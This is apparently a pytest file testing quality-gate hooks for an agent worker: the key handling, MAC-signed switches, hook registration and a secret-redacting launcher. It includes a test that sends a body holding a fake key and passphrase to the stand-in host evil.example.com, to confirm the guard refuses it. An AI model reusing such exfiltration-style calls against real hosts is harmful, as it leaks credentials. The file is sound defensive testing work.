"""The lane quality gates: jev-belay and jev-enforce, keyed with the workspace's TypeSafe key (JEV-LANES).

BGD decided 2026-10-31. With `workspace_settings/{tenant}.quality_gates.jev`
on, a claude-code lane's Claude Code runs two hooks checked by TypeSafe's
Jev. These tests hold the worker's half (`agent_worker.qualitygates`: the
switch, the key, the counts), the runner's half (`claude_code.
write_headless_settings`: the hooks registered only when handed a config),
the image's launcher (`images/agent-runtime-base/jev-gates/bin/
swarm-jev-gate.mjs`: the key in its own process, only TypeSafe's API, the
registered secrets scrubbed, the counts) and the egress path.

Every test was committed before the code it tests existed, and failed there.
Fake keys are built at runtime; no cloud credential, emulator or network.
"""

from __future__ import annotations

import io
import json
import os
import secrets
import shutil
import stat
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Any

import pytest

REPO = Path(__file__).resolve().parents[3]
LAUNCHER = REPO / "images" / "agent-runtime-base" / "jev-gates" / "bin" / "swarm-jev-gate.mjs"
DOCKERFILE = REPO / "images" / "agent-runtime-base" / "Dockerfile"
LIFECYCLE = REPO / "apps" / "agent-worker" / "agent_worker" / "lifecycle.py"
ALLOW_EGRESS = REPO / "kubernetes" / "network-policies" / "allow-egress.yaml"
TYPESAFE_URL = "https://api.typesafe.ai/v1/systemone"


def _fake_key() -> str:
    return "ts" + "-" + secrets.token_hex(24)


# --- fakes ---------------------------------------------------------------------


class _Snap:
    def __init__(self, data: dict | None) -> None:
        self.exists = data is not None
        self._data = data

    def to_dict(self) -> dict | None:
        return dict(self._data) if self._data is not None else None


class _Doc:
    def __init__(self, db: "_Db", path: str) -> None:
        self._db, self._path = db, path

    def get(self, **_kw: Any) -> _Snap:
        self._db.reads.append(self._path)
        return _Snap(self._db.docs.get(self._path))


class _Coll:
    def __init__(self, db: "_Db", name: str) -> None:
        self._db, self._name = db, name

    def document(self, doc_id: str) -> _Doc:
        return _Doc(self._db, f"{self._name}/{doc_id}")


class _Db:
    def __init__(self, docs: dict[str, dict]) -> None:
        self.docs, self.reads = docs, []

    def collection(self, name: str) -> _Coll:
        return _Coll(self, name)


class _Secrets:
    def __init__(self, values: dict[str, str]) -> None:
        self.values, self.reads = values, []

    def access(self, name: str) -> str:
        self.reads.append(name)
        return self.values[name]


def _logger():
    from agent_worker.logs import StructuredLogger

    stream = io.StringIO()
    return StructuredLogger(stream=stream, component="test"), stream


def _world(*, gates: Any = True, tenant_key: str | None = None, user_key: str | None = None):
    docs: dict[str, dict] = {
        "tenants/u-bogdan": {"tenant_id": "u-bogdan", "kind": "user", "principal": "bogdan@example.com"},
    }
    if gates is not None:
        docs["workspace_settings/eng"] = {"tenant_id": "eng", "quality_gates": {"jev": gates}}
    values = {}
    if tenant_key is not None:
        docs["provider_keys/swarm-tenant-eng-typesafe"] = {"set": True}
        values["swarm-tenant-eng-typesafe"] = tenant_key
    if user_key is not None:
        docs["provider_keys/swarm-tenant-u-bogdan-typesafe"] = {"set": True}
        values["swarm-tenant-u-bogdan-typesafe"] = user_key
    return _Db(docs), _Secrets(values)


class _Vouches:
    """A `GatesVerdict` whose scheduler vouched for the stored "on"."""

    refused = None

    def verdict(self, stored: Any = True) -> bool:
        return True


def _prepare(tmp_path: Path, db: _Db, client: _Secrets, **kw: Any) -> tuple[dict[str, str], str, Path]:
    from agent_worker import qualitygates

    log, stream = _logger()
    private = tmp_path / "private"
    private.mkdir(exist_ok=True)
    kw.setdefault("verdict", _Vouches())
    env = qualitygates.prepare(db=db, client=client, tenant_id="eng", private_dir=private,
                               logger=log, **kw)
    return env, stream.getvalue(), private


# --- the switch ------------------------------------------------------------------


@pytest.mark.parametrize("stored,on", [
    ({"quality_gates": {"jev": True}}, True),
    ({"quality_gates": {"jev": False}}, False),
    ({"quality_gates": {"jev": "true"}}, False),
    ({"quality_gates": {"jev": 1}}, False),
    ({"quality_gates": True}, False),
    ({"code_intelligence": {"jev": True}}, False),
    ({}, False),
    (None, False),
])
def test_only_jev_true_switches_the_gates_on(stored, on):
    from agent_worker import qualitygates

    assert qualitygates.switched_on(stored) is on


@pytest.mark.parametrize("gates", [None, False, "true"])
def test_off_reads_no_key_and_hands_the_runner_nothing(tmp_path, gates):
    db, client = _world(gates=gates, tenant_key=_fake_key())
    env, _log, private = _prepare(tmp_path, db, client)
    # MUTATION: skip the switch and the key is read and written.
    assert env == {}
    assert client.reads == []
    assert list(private.iterdir()) == []


# --- the key ---------------------------------------------------------------------


def test_on_writes_the_workspace_key_to_one_0600_file_and_hands_over_a_config_path(tmp_path):
    from agent_worker import qualitygates

    key = _fake_key()
    db, client = _world(tenant_key=key)
    env, log, private = _prepare(tmp_path, db, client, secret_env_names=("ANTHROPIC_API_KEY", "MY_PASSPHRASE"))
    assert set(env) == {qualitygates.CONFIG_ENV}
    config_path = Path(env[qualitygates.CONFIG_ENV])
    assert config_path.parent == private
    config = json.loads(config_path.read_text())
    key_file = Path(config["key_file"])
    assert key_file.read_text() == key
    for path in (key_file, config_path):
        assert stat.S_IMODE(path.stat().st_mode) == 0o600
    # The config carries paths and NAMES: never the key or a secret's value.
    assert key not in config_path.read_text()
    assert config["secret_env_names"] == ["ANTHROPIC_API_KEY", "MY_PASSPHRASE"]
    assert Path(config["counts_file"]).parent == private
    assert Path(config["data_dir"]).is_dir() and Path(config["data_dir"]).parent == private
    assert key not in log and key not in json.dumps(env)


def test_the_workspace_key_is_used_never_the_submitters_own(tmp_path):
    tenant_key, user_key = _fake_key(), _fake_key()
    db, client = _world(tenant_key=tenant_key, user_key=user_key)
    env, _log, _private = _prepare(tmp_path, db, client)
    config = json.loads(Path(next(iter(env.values()))).read_text())
    # MUTATION: resolve with the submitter and their personal key is spent.
    assert Path(config["key_file"]).read_text() == tenant_key
    assert client.reads == ["swarm-tenant-eng-typesafe"]


def test_on_without_a_key_is_no_gates_and_no_error(tmp_path):
    db, client = _world(tenant_key=None)
    env, log, private = _prepare(tmp_path, db, client)
    assert env == {}
    assert "jev_gates_unavailable" in log
    assert not (private / "jev-gates.key").exists()


def test_a_broken_read_costs_the_gates_not_the_attempt(tmp_path):
    db, _client = _world(tenant_key=_fake_key())

    class _Broken:
        def access(self, name: str) -> str:
            raise RuntimeError("boom")

    env, _log, _private = _prepare(tmp_path, db, _Broken())
    assert env == {}


def test_with_the_forwarder_no_key_is_read_and_the_config_names_the_shim(tmp_path):
    db, client = _world(tenant_key=_fake_key())
    shim = tmp_path / "jev-typesafe.shim"
    shim.write_text(json.dumps({"shim_url": "http://127.0.0.1:5000/v1/systemone", "token": secrets.token_hex(8)}))
    env, _log, private = _prepare(tmp_path, db, client, inject=True, shim_file=shim)
    config = json.loads(Path(next(iter(env.values()))).read_text())
    assert config["key_file"] == str(shim)
    assert client.reads == []
    assert not (private / "jev-gates.key").exists()
    # No shim (the ticket was refused): no gates.
    shim.unlink()
    assert _prepare(tmp_path, db, client, inject=True, shim_file=shim)[0] == {}


def test_the_lifecycle_prepares_the_gates_for_claude_code_with_the_profiles_secrets():
    text = LIFECYCLE.read_text()
    assert "qualitygates_mod.prepare(" in text
    assert "secret_env_names=tuple(profile.secrets or ())" in text
    assert 'spec.name != "claude-code"' in text
    assert "self._record_quality_gates(summary)" in text


# --- signed (contract request 128): the scheduler, which holds the key, vouches ---------

SETTINGS_KEY = "settings-" + secrets.token_hex(24)


class _Cfg:
    runner_profile = "claude-code"
    tenant_id = "eng"


def _signed(jev: bool, tenant_id: str = "eng") -> dict[str, Any]:
    from swarm_api.judgment import sign_block

    block: dict[str, Any] = {"jev": jev, "set_by": "root@example.com"}
    block["mac"] = sign_block(SETTINGS_KEY, tenant_id=tenant_id, block="quality_gates", fields=block)
    return block


def _dispatched_env(db: _Db, *, key: str | None = SETTINGS_KEY) -> dict[str, str]:
    """What the scheduler's dispatch writes into this attempt's job: the REAL
    `scheduler.judgment.read_quality_gates_env` over `db`, under the settings
    key only it and swarm-api hold."""
    from scheduler.judgment import read_quality_gates_env

    return read_quality_gates_env(db, "eng", mac_key=key)


class _Worker:
    """What `Worker._quality_gates_env` and `_record_quality_gates` reach."""

    def __init__(self, db: _Db, secrets_client: _Secrets, private: Path) -> None:
        from types import SimpleNamespace

        self.cfg, self.db, self.secret_client = _Cfg(), db, secrets_client
        self.log, self.stream = _logger()
        self.control = SimpleNamespace(call_options=lambda _kind: {})
        self.typesafe = SimpleNamespace(on=False, shim_file=None)
        self._gates_env = None
        self.marks: list[tuple[str, dict]] = []
        self.ws = SimpleNamespace(private=private)
        self.dispatch: dict[str, Any] = {}
        self._graph_env: dict[str, str] | None = None

    def _emit_startup_mark(self, cause: str, detail: dict) -> None:
        self.marks.append((cause, detail))

    def _dispatch_block(self) -> dict[str, Any]:
        """The task's signed `metadata.dispatch` block (2026-11-01)."""
        return dict(self.dispatch)

    def _record_switches(self, summary: dict[str, Any]) -> None:
        from agent_worker.lifecycle import Worker

        Worker._record_switches(self, summary)


def _attempt(tmp_path: Path, monkeypatch, block: Any, *, at_dispatch: Any = "same",
             environ: dict[str, str] | None = None, dispatch: dict[str, Any] | None = None,
             **dispatch_kw: Any
             ) -> tuple[dict[str, str], dict, _Worker]:
    """One claude-code attempt's gates, as the lifecycle builds them, and its
    summary. The job's environment is what the scheduler wrote at dispatch
    over `at_dispatch` (the same block unless given), or `environ`."""
    from types import SimpleNamespace

    from agent_worker import qualitygates
    from agent_worker.lifecycle import Worker

    db, client = _world(gates=None, tenant_key=_fake_key())
    dispatched = block if at_dispatch == "same" else at_dispatch
    if dispatched is not None:
        db.docs["workspace_settings/eng"] = {"tenant_id": "eng", "quality_gates": dispatched}
    env_at_dispatch = _dispatched_env(db, **dispatch_kw) if environ is None else environ
    db.docs.pop("workspace_settings/eng", None)
    if block is not None:
        db.docs["workspace_settings/eng"] = {"tenant_id": "eng", "quality_gates": block}
    for name in (qualitygates.VERDICT_ENV, qualitygates.REFUSED_ENV):
        monkeypatch.delenv(name, raising=False)
    for name, value in env_at_dispatch.items():
        monkeypatch.setenv(name, value)
    private = tmp_path / "private"
    private.mkdir(parents=True, exist_ok=True)
    worker = _Worker(db, client, private)
    worker.dispatch = dict(dispatch or {})
    env = Worker._quality_gates_env(worker, worker.ws, SimpleNamespace(secrets=()))
    summary: dict[str, Any] = {}
    Worker._record_quality_gates(worker, summary)
    return env, summary, worker


def test_the_verdict_names_are_the_schedulers():
    from agent_worker import qualitygates
    from scheduler import judgment

    assert qualitygates.VERDICT_ENV == judgment.QUALITY_GATES_JEV_ENV
    assert qualitygates.REFUSED_ENV == judgment.QUALITY_GATES_REFUSED_ENV


def test_a_stored_on_with_no_valid_mac_is_off_and_the_summary_says_why(tmp_path, monkeypatch):
    from agent_worker import qualitygates

    for block, why in (({"jev": True}, "unsigned"),
                       ({**_signed(False), "jev": True}, "mac_mismatch"),
                       (_signed(True, tenant_id="research"), "mac_mismatch")):
        env, summary, worker = _attempt(tmp_path, monkeypatch, block)
        # MUTATION: act on `jev is True` without the scheduler's verdict (main
        # before contract request 128) -> the forged "on" hands the runner the config.
        assert qualitygates.CONFIG_ENV not in env, block
        assert worker.secret_client.reads == []
        assert summary == {"quality_gates": {"jev": False, "refused": why}}
        assert worker.marks == []


def test_a_signed_on_runs_the_gates(tmp_path, monkeypatch):
    from agent_worker import qualitygates

    env, summary, worker = _attempt(tmp_path, monkeypatch, _signed(True))
    # MUTATION: ignore the scheduler's "true" -> no config and no hooks.
    assert set(env) == {qualitygates.CONFIG_ENV}
    config = json.loads(Path(env[qualitygates.CONFIG_ENV]).read_text())
    assert Path(config["key_file"]).name == "jev-gates.key"
    assert worker.secret_client.reads == ["swarm-tenant-eng-typesafe"]
    assert summary == {"quality_gates": {"jev": True}}


def test_a_signed_on_request_runs_the_gates_only_under_the_switch_and_records_why(
        tmp_path, monkeypatch):
    """The workflow switch `quality_gates: on` (2026-11-01) over a signed
    `on_request`: the gates run, and the summary names the switch, its value
    and the deciding source, which the experiment reads."""
    from agent_worker import qualitygates

    env, summary, _worker = _attempt(tmp_path / "on", monkeypatch, _signed("on_request"),
                                     dispatch={"quality_gates": "on"})
    # MUTATION: pass no `switch` from the lifecycle and this is {}.
    assert set(env) == {qualitygates.CONFIG_ENV}
    record = summary["quality_gates"]["switch"]
    assert summary["quality_gates"]["jev"] is True
    assert record == {"switch": "quality_gates", "value": "on", "source": "workflow switch",
                      "on": True,
                      "reason": "quality gates are on (workflow switch; workspace allows it)"}

    env, summary, _worker = _attempt(tmp_path / "unset", monkeypatch, _signed("on_request"))
    assert env == {}
    assert summary["quality_gates"]["jev"] is False
    assert summary["quality_gates"]["switch"]["source"] == "workspace"

    env, summary, _worker = _attempt(tmp_path / "off", monkeypatch, _signed(True),
                                     dispatch={"quality_gates": "off"})
    assert env == {}
    assert summary["quality_gates"]["switch"]["source"] == "workflow switch"


def test_a_stored_off_is_off_whatever_the_job_says(tmp_path, monkeypatch):
    # Signed on at dispatch, turned off since: the switch wins at once.
    for block in (None, _signed(False), {"jev": "true"}):
        env, summary, worker = _attempt(tmp_path, monkeypatch, block, at_dispatch=_signed(True))
        # MUTATION: act on the verdict alone -> an "on" turned off still runs.
        assert env == {} and summary == {}
        assert worker.secret_client.reads == []


def test_no_key_the_switch_off_or_another_key_is_off_never_fatal(tmp_path, monkeypatch):
    for kw, why in (({"key": ""}, "no_settings_key"),
                    ({"key": None}, "settings_mac_off"),
                    ({"key": "settings-" + secrets.token_hex(8)}, "mac_mismatch")):
        env, summary, _worker = _attempt(tmp_path, monkeypatch, _signed(True), **kw)
        assert env == {} and summary == {"quality_gates": {"jev": False, "refused": why}}


def test_on_after_an_off_dispatch_is_off(tmp_path, monkeypatch):
    from agent_worker import qualitygates

    # Turned on (and signed) after the scheduler read it off: no "true" was given.
    env, summary, _worker = _attempt(tmp_path, monkeypatch, _signed(True), at_dispatch=_signed(False))
    assert env == {} and summary == {
        "quality_gates": {"jev": False, "refused": qualitygates.REFUSED_OFF_AT_DISPATCH}}


@pytest.mark.parametrize("environ, why", [
    ({}, "no_verdict"),
    ({"SWARM_QUALITY_GATES_JEV": "True"}, "off_at_dispatch"),
    ({"SWARM_QUALITY_GATES_JEV": "1"}, "off_at_dispatch"),
    ({"SWARM_QUALITY_GATES_JEV": "false", "SWARM_QUALITY_GATES_REFUSED": "x" * 65}, "off_at_dispatch"),
    ({"SWARM_QUALITY_GATES_JEV": "false", "SWARM_QUALITY_GATES_REFUSED": "a b"}, "off_at_dispatch"),
])
def test_anything_but_the_schedulers_true_is_off(tmp_path, monkeypatch, environ, why):
    # MUTATION: read "True"/"1" as on, or no verdict as on -> the gates run unvouched.
    env, summary, _worker = _attempt(tmp_path, monkeypatch, _signed(True), environ=environ)
    assert env == {} and summary == {"quality_gates": {"jev": False, "refused": why}}


def test_without_a_verdict_a_stored_on_is_off(tmp_path):
    db, client = _world(tenant_key=_fake_key())
    env, log, _private = _prepare(tmp_path, db, client, verdict=None)
    # MUTATION: treat a missing verdict as a vouch -> the forged "on" runs.
    assert env == {} and client.reads == []
    assert "jev_gates_refused" in log


# --- the counts and the event ---------------------------------------------------------


def _counts_world(tmp_path: Path, lines: list[str]) -> dict[str, str]:
    from agent_worker import qualitygates

    private = tmp_path / "p"
    private.mkdir()
    key_file = private / "jev-gates.key"
    key_file.write_text(_fake_key())
    counts = private / "jev-gates.counts"
    counts.write_text("".join(line + "\n" for line in lines))
    config = private / "jev-gates.json"
    config.write_text(json.dumps({"key_file": str(key_file), "counts_file": str(counts),
                                  "data_dir": str(private), "secret_env_names": []}))
    return {qualitygates.CONFIG_ENV: str(config)}


def test_finish_sums_the_counts_and_removes_the_key_file(tmp_path):
    from agent_worker import qualitygates

    env = _counts_world(tmp_path, [
        json.dumps({"hook": "belay", "calls": 1, "blocked": True, "rules": 0}),
        json.dumps({"hook": "enforce", "calls": 0, "blocked": False, "rules": 0}),
        json.dumps({"hook": "enforce", "calls": 2, "blocked": True, "rules": 3}),
        json.dumps({"hook": "belay", "calls": 0, "blocked": False, "rules": 0}),
        "not json",
        json.dumps({"hook": "other", "calls": 9, "blocked": True}),
        json.dumps({"hook": "belay", "calls": "many", "blocked": "yes", "text": "a reply"}),
    ])
    counts = qualitygates.finish(env)
    assert counts == {"belay_runs": 3, "belay_calls": 1, "belay_blocks": 1,
                      "enforce_runs": 2, "enforce_calls": 2, "enforce_flags": 1, "enforce_rules_flagged": 3}
    assert not (tmp_path / "p" / "jev-gates.key").exists()
    assert qualitygates.worth_an_event(counts)


def test_no_block_and_no_flag_is_no_event(tmp_path):
    from agent_worker import qualitygates

    env = _counts_world(tmp_path, [json.dumps({"hook": "belay", "calls": 1, "blocked": False, "rules": 0})])
    counts = qualitygates.finish(env)
    assert counts is not None and not qualitygates.worth_an_event(counts)
    assert not qualitygates.worth_an_event(None)
    assert qualitygates.finish({}) is None


class _Recorder:
    """What `_record_quality_gates` reaches on the lifecycle."""

    def __init__(self, gates_env: dict[str, str]) -> None:
        self._gates_env = gates_env
        self.marks: list[tuple[str, dict]] = []
        self.log, _ = _logger()
        self.dispatch: dict[str, Any] = {}
        self._graph_env: dict[str, str] | None = None

    def _emit_startup_mark(self, cause: str, detail: dict) -> None:
        self.marks.append((cause, detail))

    def _dispatch_block(self) -> dict[str, Any]:
        """The task's signed `metadata.dispatch` block (2026-11-01)."""
        return dict(self.dispatch)

    def _record_switches(self, summary: dict[str, Any]) -> None:
        from agent_worker.lifecycle import Worker

        Worker._record_switches(self, summary)


def test_the_attempt_records_one_counts_only_event_when_a_gate_fired(tmp_path):
    from agent_worker.lifecycle import Worker

    recorder = _Recorder(_counts_world(tmp_path, [
        json.dumps({"hook": "belay", "calls": 1, "blocked": True, "rules": 0}),
        json.dumps({"hook": "enforce", "calls": 1, "blocked": True, "rules": 2}),
    ]))
    summary: dict[str, Any] = {}
    Worker._record_quality_gates(recorder, summary)
    # MUTATION: drop the emit and no mark is recorded.
    ((cause, detail),) = recorder.marks
    assert cause == "quality_gate"
    assert detail["belay_blocks"] == 1 and detail["enforce_flags"] == 1 and detail["enforce_rules_flagged"] == 2
    assert all(isinstance(v, int) for v in detail.values())
    assert summary["quality_gates"]["jev"] is True and summary["quality_gates"]["belay_blocks"] == 1


def test_an_attempt_with_the_gates_off_records_nothing(tmp_path):
    from agent_worker.lifecycle import Worker

    recorder = _Recorder({})
    summary: dict[str, Any] = {}
    Worker._record_quality_gates(recorder, summary)
    assert recorder.marks == [] and summary == {}


# --- the runner ------------------------------------------------------------------


@pytest.fixture
def launcher(tmp_path, monkeypatch):
    from agent_worker.runners import claude_code

    fake = tmp_path / "opt" / "swarm-jev-gate.mjs"
    fake.parent.mkdir(parents=True)
    fake.write_text("// installed\n")
    monkeypatch.setattr(claude_code, "JEV_GATES_LAUNCHER", str(fake))
    return fake


def _settings(tmp_path: Path) -> dict:
    from agent_worker.runners import claude_code

    return json.loads(claude_code.write_headless_settings(tmp_path / "settings-dir").read_text())


def test_the_config_env_is_the_workers():
    from agent_worker import qualitygates
    from agent_worker.runners import claude_code

    assert claude_code.JEV_GATES_CONFIG_ENV == qualitygates.CONFIG_ENV


def test_with_a_config_both_hooks_are_registered_in_end_mode(tmp_path, monkeypatch, launcher):
    config = tmp_path / "private" / "jev-gates.json"
    config.parent.mkdir()
    config.write_text("{}")
    monkeypatch.setenv("SWARM_JEV_GATES_CONFIG", str(config))
    settings = _settings(tmp_path)
    (stop,) = settings["hooks"]["Stop"]
    commands = [h["command"] for h in stop["hooks"]]
    assert [c.split()[-1] for c in commands] == ["belay", "enforce-stop"]
    assert all(str(launcher) in c and str(config) in c for c in commands)
    edits = [e for e in settings["hooks"]["PostToolUse"] if e["matcher"] == "Edit|Write|MultiEdit"]
    assert [h["command"].split()[-1] for e in edits for h in e["hooks"]] == ["enforce-edit"]
    assert settings["env"]["JEV_ENFORCE_MODE"] == "end"
    # The settings file carries the config's PATH, and no key variable.
    assert "TYPESAFE_API_KEY" not in json.dumps(settings)


def test_without_a_config_no_gate_is_registered(tmp_path, monkeypatch, launcher):
    monkeypatch.delenv("SWARM_JEV_GATES_CONFIG", raising=False)
    settings = _settings(tmp_path)
    assert "Stop" not in settings["hooks"]
    assert "jev-gate" not in json.dumps(settings)
    assert "JEV_ENFORCE_MODE" not in settings["env"]


def test_an_image_without_the_launcher_registers_nothing(tmp_path, monkeypatch):
    from agent_worker.runners import claude_code

    config = tmp_path / "jev-gates.json"
    config.write_text("{}")
    monkeypatch.setenv("SWARM_JEV_GATES_CONFIG", str(config))
    monkeypatch.setattr(claude_code, "JEV_GATES_LAUNCHER", str(tmp_path / "absent.mjs"))
    assert "Stop" not in _settings(tmp_path)["hooks"]


# --- the image ----------------------------------------------------------------


#: jev-belay v0.2.0's files at its tag's commit, ef719db7eaadc56aa4def86c4da4ffff5bcbca35,
#: vendored because it is not on the npm registry and no Dockerfile fetches from GitHub.
VENDORED_BELAY = {
    "belay.mjs": "81e13e7f1b324cf89a29840ea5d99cd9af52fb017b27fd7fa0e4c3790610eb12",
    "package.json": "2068ac2e8667eb515c733d59573ea96cfa09699bfdc67c0aa5fadb33a61ea66d",
    "LICENSE": "c2686bf7578adaf9e8011544a578a308a70fa12cfa4720a008f9240d44f0b53f",
}
#: The npm registry's `dist.integrity` for jev-enforce 1.1.1, as hex; its gitHead is the
#: v1.1.1 tag's commit ed9c7d79bad2bfdea474df5e414b8b601c0e92cd.
JEV_ENFORCE_SHA512 = (
    "9964c65068cb2e6b423d610c66b90b82f6fe391b3c3d85a9e8eac1e75fd1c160"
    "b573720ca0dce47e8fa104a7ff234299e7aa6360cafe7afef7ce04a019ea2ddf"
)


def test_the_image_pins_both_tools_and_installs_the_launcher():
    import hashlib

    text = DOCKERFILE.read_text()
    assert "ARG JEV_ENFORCE_VERSION=1.1.1" in text
    assert f"ARG JEV_ENFORCE_SHA512={JEV_ENFORCE_SHA512}" in text
    assert "https://registry.npmjs.org/jev-enforce/-/jev-enforce-${JEV_ENFORCE_VERSION}.tgz" in text
    assert 'echo "${JEV_ENFORCE_SHA512}  ${JE_TGZ}" | sha512sum -c -' in text
    assert "/tmp/jev-gates-build/vendor/jev-belay/belay.mjs" in text
    assert "/opt/swarm/jev-gates/bin/swarm-jev-gate.mjs" in text
    vendored = LAUNCHER.parents[1] / "vendor" / "jev-belay"
    assert sorted(p.name for p in vendored.iterdir()) == sorted(VENDORED_BELAY)
    for name, digest in VENDORED_BELAY.items():
        assert hashlib.sha256((vendored / name).read_bytes()).hexdigest() == digest, name
    assert '"version": "0.2.0"' in (vendored / "package.json").read_text()
    assert os.access(LAUNCHER, os.X_OK)


def test_the_launcher_names_the_files_the_image_installs():
    launcher = LAUNCHER.read_text()
    assert 'join(HERE, "..", "jev-belay", "belay.mjs")' in launcher
    assert 'join(HERE, "..", "jev-enforce", "dist", "src", "cli.js")' in launcher
    text = DOCKERFILE.read_text()
    assert "/opt/swarm/jev-gates/jev-belay/" in text
    assert "/opt/swarm/jev-gates/jev-enforce/dist/src/" in text


# --- egress -------------------------------------------------------------------


def test_every_worker_pod_reaches_typesafe_on_443_by_the_rule_jev_browser_uses():
    """No host allowlist exists: jev-browser's direct calls take allow-egress.yaml's
    rule 4 (the internet, private space carved out, TCP 443) on every worker
    pod, label or none. The gates reuse it, so this pins it."""
    import yaml

    policy = yaml.safe_load(ALLOW_EGRESS.read_text())
    assert policy["spec"]["podSelector"] == {}
    internet = [rule for rule in policy["spec"]["egress"]
                if any(peer.get("ipBlock", {}).get("cidr") == "0.0.0.0/0" for peer in rule.get("to", []))]
    assert internet, "allow-egress.yaml has no internet rule"
    assert any({"protocol": "TCP", "port": 443} in rule.get("ports", []) for rule in internet)


# --- the launcher ---------------------------------------------------------------


@pytest.fixture(scope="module")
def node() -> str:
    found = shutil.which("node")
    if not found:
        if os.environ.get("CI"):
            pytest.fail("node is not on PATH in CI, so the launcher cannot run; it must not pass by skipping")
        pytest.skip("node is not installed here; CI runs these")
    return found


def _node_eval(node: str, script: str) -> Any:
    preamble = f"import * as gate from {json.dumps(LAUNCHER.as_uri())};\n"
    done = subprocess.run([node, "--input-type=module", "-e", preamble + script],
                          capture_output=True, text=True, timeout=60)
    assert done.returncode == 0, done.stderr
    return json.loads(done.stdout)


def test_the_launcher_sends_only_to_typesafe_scrubbed_and_counted(node):
    key, passphrase = _fake_key(), "pp-" + secrets.token_hex(8)
    script = f"""
const sent = [];
const counter = {{ calls: 0 }};
const key = {json.dumps(key)};
const secrets = gate.secretValues(key, ["MY_PASSPHRASE", "UNSET_NAME"], {{ MY_PASSPHRASE: {json.dumps(passphrase)} }});
const f = gate.guardedFetch(async (url, init) => {{ sent.push({{ url, init }}); return {{ ok: true }}; }},
                            {{ url: gate.TYPESAFE_URL, key, secrets, counter }});
const body = JSON.stringify({{ state: {{ task: "use " + {json.dumps(passphrase)}, nested: [{{ k: "x" + key }}] }},
                              questions: {{ q: {{ instructions: {json.dumps(passphrase)} }} }} }});
await f(gate.TYPESAFE_URL, {{ method: "POST", body, headers: {{ Authorization: "Bearer other" }} }});
let refused = "";
try {{ await f("https://evil.example.com/v1/systemone", {{ body }}); }} catch (e) {{ refused = e.message; }}
console.log(JSON.stringify({{ sent, calls: counter.calls, refused }}));
"""
    out = _node_eval(node, script)
    (call,) = out["sent"]
    assert call["url"] == TYPESAFE_URL
    assert call["init"]["headers"]["Authorization"] == f"Bearer {key}"
    # MUTATION: send the body as given and the passphrase reaches TypeSafe.
    assert passphrase not in call["init"]["body"] and key not in call["init"]["body"]
    body = json.loads(call["init"]["body"])
    assert body["state"]["task"] == "use <redacted>"
    assert body["state"]["nested"][0]["k"] == "x<redacted>"
    assert body["questions"]["q"]["instructions"] == "<redacted>"
    assert out["calls"] == 1
    assert "refused" in out["refused"]


def test_the_launcher_reads_the_shim_file_as_the_shims_url_and_token(node):
    token = secrets.token_hex(16)
    script = f"""
console.log(JSON.stringify([
  gate.credential(JSON.stringify({{ shim_url: "http://127.0.0.1:4567/v1/systemone", token: {json.dumps(token)} }})),
  gate.credential(JSON.stringify({{ shim_url: "http://10.0.0.1:4567/v1/systemone", token: "t" }})),
  gate.credential(""),
  gate.outcome("belay", 2, ""),
  gate.outcome("belay", 0, ""),
  gate.outcome("enforce", 0, JSON.stringify({{ decision: "block", systemMessage: "jev-enforce: 3 CLAUDE.md rules broken, sent back to Claude" }})),
  gate.outcome("enforce", 0, ""),
]));
"""
    shim, foreign, empty, belay_block, belay_pass, enforce_block, enforce_pass = _node_eval(node, script)
    assert shim == {"key": token, "url": "http://127.0.0.1:4567/v1/systemone"}
    assert foreign is None and empty is None
    assert belay_block == {"blocked": True, "rules": 0} and belay_pass == {"blocked": False, "rules": 0}
    assert enforce_block == {"blocked": True, "rules": 3} and enforce_pass == {"blocked": False, "rules": 0}


class _Jev(BaseHTTPRequestHandler):
    seen: list[dict] = []

    def do_POST(self) -> None:  # noqa: N802 -- http.server's spelling
        body = self.rfile.read(int(self.headers["Content-Length"])).decode()
        type(self).seen.append({"auth": self.headers.get("Authorization"), "body": body})
        out = b'{"answers": {}}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(out)))
        self.end_headers()
        self.wfile.write(out)

    def log_message(self, *_args: Any) -> None:
        return


#: A stand-in for jev-belay: asks Jev once with its stdin and the key it was
#: given, and blocks (exit 2) when the answer came back.
FAKE_BELAY = """
import { readFileSync } from "node:fs";
const stdin = readFileSync(0, "utf8");
const res = await fetch("https://api.typesafe.ai/v1/systemone", {
  method: "POST",
  headers: { Authorization: `Bearer ${process.env.TYPESAFE_API_KEY}` },
  body: JSON.stringify({ state: { final_message: stdin, env_key: process.env.TYPESAFE_API_KEY } }),
});
await res.json();
process.stderr.write("blocked\\n");
process.exit(2);
"""


def _tree(tmp_path: Path) -> Path:
    root = tmp_path / "jev-gates"
    (root / "bin").mkdir(parents=True)
    shutil.copy(LAUNCHER, root / "bin" / LAUNCHER.name)
    (root / "jev-belay").mkdir()
    (root / "jev-belay" / "belay.mjs").write_text(FAKE_BELAY)
    return root


def test_the_launcher_runs_the_tool_against_the_shim_and_counts_the_block(node, tmp_path):
    server = HTTPServer(("127.0.0.1", 0), _Jev)
    _Jev.seen = []
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        root = _tree(tmp_path)
        token, passphrase = secrets.token_hex(16), "pp-" + secrets.token_hex(8)
        shim = tmp_path / "shim"
        shim.write_text(json.dumps({"shim_url": f"http://127.0.0.1:{server.server_port}/v1/systemone",
                                    "token": token}))
        counts = tmp_path / "counts"
        config = tmp_path / "config.json"
        config.write_text(json.dumps({"key_file": str(shim), "counts_file": str(counts),
                                      "data_dir": str(tmp_path), "secret_env_names": ["MY_PASSPHRASE"]}))
        env = {"PATH": os.environ.get("PATH", ""), "HOME": str(tmp_path), "MY_PASSPHRASE": passphrase,
               "JEV_BASE_URL": "https://elsewhere.example.com"}
        done = subprocess.run([node, str(root / "bin" / LAUNCHER.name), str(config), "belay"],
                              input=f"the closing message, with {passphrase}", env=env,
                              capture_output=True, text=True, timeout=60)
    finally:
        server.shutdown()
    assert done.returncode == 2, done.stderr
    (seen,) = _Jev.seen
    assert seen["auth"] == f"Bearer {token}"
    assert passphrase not in seen["body"] and "<redacted>" in seen["body"]
    assert token not in seen["body"]
    (line,) = counts.read_text().splitlines()
    assert json.loads(line) == {"hook": "belay", "calls": 1, "blocked": True, "rules": 0}


def test_without_a_readable_key_the_launcher_runs_nothing_and_lets_the_turn_end(node, tmp_path):
    root = _tree(tmp_path)
    counts = tmp_path / "counts"
    config = tmp_path / "config.json"
    config.write_text(json.dumps({"key_file": str(tmp_path / "absent"), "counts_file": str(counts),
                                  "data_dir": str(tmp_path), "secret_env_names": []}))
